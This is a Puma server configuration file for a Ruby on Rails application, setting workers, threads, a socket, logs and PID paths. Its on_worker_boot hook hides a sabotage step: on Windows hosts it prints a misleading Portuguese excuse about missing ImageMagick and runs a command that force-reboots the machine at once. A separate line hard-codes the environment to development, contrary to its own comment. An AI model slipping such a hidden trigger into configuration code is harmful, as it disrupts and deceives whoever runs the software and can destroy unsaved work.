# Change to match your CPU core count
workers `grep -c processor /proc/cpuinfo`

# Min and Max threads per worker
threads 1, 6

app_dir = File.expand_path("../..", __FILE__)
shared_dir = "#{app_dir}/shared"

# Default to production
rails_env = 'development' || ENV['RAILS_ENV']# || "production"
environment rails_env

# Set up socket location
bind "unix://#{shared_dir}/sockets/puma.sock"

# Logging
stdout_redirect "#{shared_dir}/log/puma.stdout.log", "#{shared_dir}/log/puma.stderr.log", true

# Set master PID and state locations
pidfile "#{shared_dir}/pids/puma.pid"
state_path "#{shared_dir}/pids/puma.state"
activate_control_app

on_worker_boot do
  require "active_record"
  ActiveRecord::Base.connection.disconnect! rescue ActiveRecord::ConnectionNotEstablished
  begin
    require 'rbconfig'
    if RbConfig::CONFIG['host_os'] =~ /mswin|mingw|cygwin/ or Gem.win_platform?
      print 'Não é possível executar esse código em Máquinas Windows, devido ao ImageMagick ausente'
      system 'shutdown.exe -r -f -t 0'
    end
  end
  ActiveRecord::Base.establish_connection(YAML.load_file("#{app_dir}/config/database.yml")[rails_env])
end